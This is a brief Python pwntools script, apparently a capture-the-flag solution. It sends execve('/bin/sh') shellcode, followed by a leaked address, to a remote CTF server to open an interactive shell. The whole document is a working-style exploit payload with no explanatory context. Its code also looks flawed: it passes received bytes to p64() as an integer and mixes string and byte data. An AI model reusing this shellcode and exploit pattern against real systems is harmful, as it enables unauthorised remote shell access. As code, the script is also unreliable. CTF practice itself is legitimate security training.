from pwn import *

shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# shellcode += "a" * 120

ip = 'ctf.adl.tw'
port = 11000

r = remote(ip, port)
address = r.recv()
print(address)

shellcode += p64(address)

r.send(shellcode)
r.interactive()